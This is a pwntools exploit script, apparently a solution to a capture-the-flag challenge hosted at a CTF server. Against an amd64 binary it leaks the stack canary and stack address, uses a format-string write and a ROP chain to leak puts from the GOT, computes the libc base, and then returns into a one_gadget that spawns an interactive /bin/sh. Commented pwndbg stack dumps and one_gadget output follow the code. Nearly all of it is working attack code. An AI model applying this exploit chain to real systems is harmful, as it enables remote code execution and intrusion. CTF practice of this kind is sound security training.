from pwn import *
context.log_level='debug'
context.arch='amd64'
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
elf=ELF('./pwn')
while True:
    # p=process('./pwn')
    p=remote('ctf.v50to.cc',10376)
    # gdb.attach(p,'b *0x00000000004009FF')
    # pause()

    p.recvuntil(b'name?\n')
    payload=b'a'*0x28
    p.sendline(payload)
    # print(p.recv())
    p.recvuntil(payload+b'\n')
    canary=u64(b'\x00'+p.recv(7))
    stackaddr=u64(p.recv(6)+b'\x00\x00')
    print('canary',hex(canary))
    print('stackaddr',hex(stackaddr))
    p.recvuntil(b'gift\n')
    p.send(payload+p64(canary))
    pause()
    p.recvuntil(b'choice?\n')
    p.send(b'a')
    p.recvuntil(b'my choice is ')
    if p.recv(1)!=b'b':
        p.close()
        print("fail in first step")
        continue
    print("success in first step")
    # p.recvuntil(b'gift\n')
    puts_got=elf.got['puts']
    puts_plt=elf.plt['puts']
    main=0x0000000000400A27
    pop_rdi=0x0000000000400bb3
    # 将0x68a改为格式化字符串漏洞，否则main写不进去，第8个参数为格式化字符串第一个参数
    payload=b'%14$hn%64c%13$hn%2535c%12$hn'.ljust(0x20,b'a')
    payload+=p64(stackaddr+0x20)+p64(stackaddr+0x22)+p64(stackaddr+0x24)
    payload=payload.ljust(0x68,b'a')
    payload+=p64(canary)+p64(stackaddr)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)#+p64(main)
    # payload=b'aaaaaaaa-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p'



    # gdb.attach(p,'b *0x0000000000400B10')
    pause()
    p.recvuntil(b'want?\n')
    p.send(payload)
    # p.recvuntil(b'aaaa')
    # p.interactive()
    p.recvuntil(b'!\n')
    puts_addr=u64(p.recv(6)+b'\x00\x00')
    print('puts_addr',hex(puts_addr))
    libc_base=puts_addr-libc.sym['puts']
    print('libc_base',hex(libc_base))

    one_gadget=libc_base+0xf03a4
    # gdb.attach(p,'b *0x0000000000400AC7')
    pause()
    p.recvuntil(b'name?\n')
    payload2=b'a'*0x28+p64(canary)
    p.send(payload2)
    pause()
    # print(p.recv())

    p.recvuntil(b'gift\n')
    p.send(payload2)
    pause()
    p.recvuntil(b'choice?\n')
    p.send(b'a')
    p.recvuntil(b'my choice is ')
    pause()
    if p.recv(1)!=b'b':
        p.close()
        print("fail in sec step")
        continue
    print("success in sec step")
    payload3=b'\x00'*0x68+p64(canary)+p64(stackaddr)+p64(one_gadget)
    # gdb.attach(p,'b *0x0000000000400AFF')
    p.recvuntil(b'want?\n')
    p.send(payload3)
    p.interactive()

# 0x125825ca0
# 0x10a240040
# 0x7fff126a1620
# 0x7fff126a1620
# 
# stackaddr 0x7fff1e46e830
'''
pwndbg> stack 50
00:0000│ rsp 0x7fff1e46e7b0 —▸ 0x7fff1e46e928 —▸ 0x7fff1e4702f5 ◂— 'COLORFGBG=15;0'
01:0008│     0x7fff1e46e7b8 ◂— 0x100000000
02:0010│ rsi 0x7fff1e46e7c0 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
... ↓        12 skipped
0f:0078│     0x7fff1e46e828 ◂— 0xd5f195671ad01400
10:0080│ rbp 0x7fff1e46e830 ◂— 0x7fff1e46e830
11:0088│     0x7fff1e46e838 —▸ 0x400bb3 (__libc_csu_init+99) ◂— pop rdi
12:0090│     0x7fff1e46e840 —▸ 0x602018 (puts@got[plt]) —▸ 0x7fa4a626f6a0 (puts) ◂— push r12
13:0098│     0x7fff1e46e848 —▸ 0x400690 (puts@plt) ◂— jmp qword ptr [rip + 0x201982]
14:00a0│     0x7fff1e46e850 ◂— 0x1a6825ca0
'''

'''
└─$ one_gadget /home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''